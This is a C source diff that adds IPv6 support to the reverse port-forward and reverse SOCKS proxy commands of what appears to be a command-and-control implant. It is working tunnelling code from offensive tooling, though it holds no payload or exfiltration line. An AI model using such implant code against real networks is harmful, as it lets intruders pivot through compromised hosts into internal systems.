@@ -2635,6 +2635,8 @@ VOID CommandSocket( PPARSER Parser )
             DWORD FwdAddr = 0;
             DWORD FwdPort = 0;
 
+            // TODO: add support for IPv6
+
             /* Parse Host and Port to bind to */
             LclAddr = ParserGetInt32( Parser );
             LclPort = ParserGetInt32( Parser );
@@ -2644,7 +2646,7 @@ VOID CommandSocket( PPARSER Parser )
             FwdPort = ParserGetInt32( Parser );
 
             /* Create a reverse port forward socket and insert it into the linked list. */
-            Socket = SocketNew( NULL, SOCKET_TYPE_REVERSE_PORTFWD, LclAddr, LclPort, FwdAddr, FwdPort );
+            Socket = SocketNew( NULL, SOCKET_TYPE_REVERSE_PORTFWD, LclAddr, NULL, LclPort, FwdAddr, FwdPort );
 
             /* if Socket is not NULL then we managed to start a socket. */
             PackageAddInt32( Package, Socket ? TRUE : FALSE );
@@ -2675,7 +2677,7 @@ VOID CommandSocket( PPARSER Parser )
                     PackageAddInt32( Package, Socket->ID );
 
                     /* Add our Bind Host & Port data */
-                    PackageAddInt32( Package, Socket->LclAddr );
+                    PackageAddInt32( Package, Socket->IPv4 );
                     PackageAddInt32( Package, Socket->LclPort );
 
                     /* Add our Forward Host & Port data */
@@ -2797,7 +2799,8 @@ VOID CommandSocket( PPARSER Parser )
             LPSTR Host       = NULL;
             INT   HostIpSize = 0;
             PBYTE HostIp     = NULL;
-            DWORD Addr       = 0;
+            DWORD IPv4       = 0;
+            PBYTE IPv6       = NULL;
             INT16 Port       = 0;
             LPSTR Domain     = NULL;
 
@@ -2810,11 +2813,11 @@ VOID CommandSocket( PPARSER Parser )
             if ( ATYP == 1 )
             {
                 // IPv4
-                Addr  = 0;
-                Addr |= ( HostIp[0] << ( 8 * 0 ));
-                Addr |= ( HostIp[1] << ( 8 * 1 ));
-                Addr |= ( HostIp[2] << ( 8 * 2 ));
-                Addr |= ( HostIp[3] << ( 8 * 3 ));
+                IPv4  = 0;
+                IPv4 |= ( HostIp[0] << ( 8 * 0 ));
+                IPv4 |= ( HostIp[1] << ( 8 * 1 ));
+                IPv4 |= ( HostIp[2] << ( 8 * 2 ));
+                IPv4 |= ( HostIp[3] << ( 8 * 3 ));
             }
             else if ( ATYP == 3 )
             {
@@ -2824,27 +2827,34 @@ VOID CommandSocket( PPARSER Parser )
                 Domain = Instance.Win32.LocalAlloc( LPTR, HostIpSize + 1 );
                 MemCopy( Domain, HostIp, HostIpSize );
 
-                Addr = DnsQueryIP( (LPSTR)Domain );
+                IPv4 = DnsQueryIPv4( (LPSTR)Domain );
+
+                // if the domain does not have an IPv4, try with IPv6
+                if ( ! IPv4 )
+                {
+                    IPv6 = DnsQueryIPv6( (LPSTR)Domain );
+                    if ( ! IPv6 )
+                    {
+                        PRINTF( "Could not resolve domain: %s\n", Domain );
+                    }
+                }
 
                 Instance.Win32.LocalFree( Domain );
             }
-            else
+            else if ( ATYP == 4 )
             {
-                // TODO: add IPv6 support
-                PRINTF( "ATYP %x is not supported\n", ATYP )
-                PackageAddInt32( Package, FALSE );
-                PackageAddInt32( Package, ScId );
-                PackageAddInt32( Package, ATYP );
-                break;
+                // IPv6
+                IPv6 = Instance.Win32.LocalAlloc( LPTR, 16 );
+                MemCopy( IPv6, HostIp, 16 );
             }
 
             PRINTF( "Socket ID: %x\n", ScId )
 
             /* check if address is not 0 */
-            if ( Addr )
+            if ( IPv4 || IPv6 )
             {
                 /* Create a socks proxy socket and insert it into the linked list. */
-                if ( ( Socket = SocketNew( NULL, SOCKET_TYPE_REVERSE_PROXY, Addr, Port, 0, 0 ) ) )
+                if ( ( Socket = SocketNew( NULL, SOCKET_TYPE_REVERSE_PROXY, IPv4, IPv6, Port, 0, 0 ) ) )
                     Socket->ID = ScId;
 
                 PackageAddInt32( Package, Socket ? TRUE : FALSE );
@@ -2852,8 +2862,13 @@ VOID CommandSocket( PPARSER Parser )
             else PackageAddInt32( Package, FALSE );
 
             PackageAddInt32( Package, ScId );
-            PackageAddInt32( Package, ATYP );
             PackageAddInt32( Package, NtGetLastError() );
+
+            if ( IPv6 )
+            {
+                Instance.Win32.LocalFree( IPv6 );
+                IPv6 = NULL;
+            }
 
             break;
         }
